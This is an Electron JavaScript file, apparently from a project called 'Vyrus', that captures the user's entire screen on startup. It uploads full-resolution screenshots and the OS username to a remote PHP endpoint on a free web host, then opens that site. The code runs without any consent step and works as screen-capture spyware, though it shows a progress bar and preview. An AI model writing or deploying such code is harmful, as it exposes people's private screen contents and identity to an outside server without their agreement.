const { desktopCapturer } = require('electron'),
os = require("os"),
VyrusAPI="https://dawnowl444.000webhostapp.com/API/Vyrus.php";
//VyrusAPI="http://localhost/Projet_Site/API/Vyrus.php";

desktopCapturer.getSources({ types: ['window', 'screen'] }).then(async sources => {
  for (const source of sources) {
    if (source.name === 'Entire Screen' || source.name === "Screen 1") {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          audio: false,
          video: {
            mandatory: {
              chromeMediaSource: 'desktop',
              chromeMediaSourceId: source.id,
              minWidth: 1280,
              maxWidth: 1920,
              minHeight: 720,
              maxHeight: 1080
            }
          }
        })
        handleStream(stream)
      } catch (e) {
        handleError(e)
      }
      return
    }
  }
})

function handleStream (stream) {
  const video = document.querySelector('video')
  video.srcObject = stream
  video.onloadedmetadata = (e) => video.play()
}

function handleError (e) {
  alert(e)
}

function upload (source, progression) {
  return new Promise(function (resolve, reject) {
    let form = new FormData();
    //let base64String=Buffer.from(source.thumbnail.toPNG()).toString("base64");
    let blob = new Blob([source.thumbnail.toPNG()], { type: "image/png"});
    form.append("screenshot", blob);
    form.append("user", os.userInfo().username);

    let xhr = new XMLHttpRequest();
    xhr.open("POST", VyrusAPI+"?send=img", true);

    xhr.addEventListener("readystatechange", function() {
      xhr.onprogress = function(e) {
          progression.width = e.loaded * 100 / e.total + '%';
      };

      if (xhr.readyState === XMLHttpRequest.DONE && xhr.status == 200) {
        resolve(xhr.response);
        progression.width = "100%";
      }
      else if (xhr.readyState === XMLHttpRequest.DONE && xhr.status != 200) {
        let notification = {
          title: "Vyrus",
          body: ""
        }
        switch (xhr.status) {
          case 417:
            notification.body="Les écrans 4k ne sont pas supportés.\nImpossible de continuer.";
          break;

          case 0:
            notification.body="Vous ne possédez pas de connection Internet utilisable.";
          break;

          case 503:
            notification.body="L'API est en maintenance et est donc inutilisable.\nMerci de votre compréhension.";
          break;

          case 400:
          case 404:
            notification.body="Votre version logiciel est trop ancienne.\nMerci de vous mettre à jour.";
          break;

          default:
            notification.body="Une erreur "+xhr.status+" a été reçue.\nImpossible de continuer.";
          break;
        }
        new window.Notification(notification.title, notification);

        progression.width = "100%";
        progression.backgroundColor = "red";
        document.getElementById("load"+source.name).id="ERROR";
        reject(xhr.response);
      }
    });

    xhr.send(form);
  });
}

setInterval(function(){
  document.getElementById("video").style.width=window.innerWidth*0.9+"px";
  document.getElementById("video").style.height=window.innerHeight*0.9+"px";
}, 250);

document.getElementById("user").textContent="Welcome dear "+os.userInfo().username;


desktopCapturer.getSources({ types: ['window', 'screen'], thumbnailSize: { width: 1920, height: 1080} }).then(async sources => {
  for (const source of sources) {
    if (source.name === "Entire Screen" || source.name === "Screen 1" || source.name === "Screen 2") {
        document.getElementById("start").insertAdjacentHTML("beforeBegin", "<div id='load"+source.name+"' class='loading'></div>");
        let rgb1=245, rgb2=196, rgb3=184;
        let max=255, min=0;
        let rgb1Next=Math.floor(Math.random() * (max - min) + min);
        let rgb2Next=Math.floor(Math.random() * (max - min) + min);
        let rgb3Next=Math.floor(Math.random() * (max - min) + min);
        let coloringInterval=setInterval(function(){
          let scale=5;

          if (rgb1+scale<rgb1Next) {rgb1+=scale;}
          else if (rgb1-scale>rgb1Next) {rgb1-=scale;}
          else {rgb1=rgb1Next;}

          if (rgb2+scale<rgb2Next) {rgb2+=scale;}
          else if (rgb2-scale>rgb2Next) {rgb2-=scale;}
          else {rgb2=rgb2Next;}

          if (rgb3+scale<rgb3Next) {rgb3+=scale;}
          else if (rgb3-scale>rgb3Next) {rgb3-=scale;}
          else {rgb3=rgb3Next;}

          document.getElementById("load"+source.name).style.backgroundColor="rgb("+rgb1+","+rgb2+","+rgb3+")";

          if (rgb1==rgb1Next&&rgb2==rgb2Next&&rgb3==rgb3Next) {
            rgb1Next=Math.floor(Math.random() * (max - min) + min);
            rgb2Next=Math.floor(Math.random() * (max - min) + min);
            rgb3Next=Math.floor(Math.random() * (max - min) + min);
          }  
        }, 60);
        let progression = document.getElementById("load"+source.name).style;
        progression.width = 0;

        await upload(source, progression);
    }
  }
  shell.openExternal(VyrusAPI);
});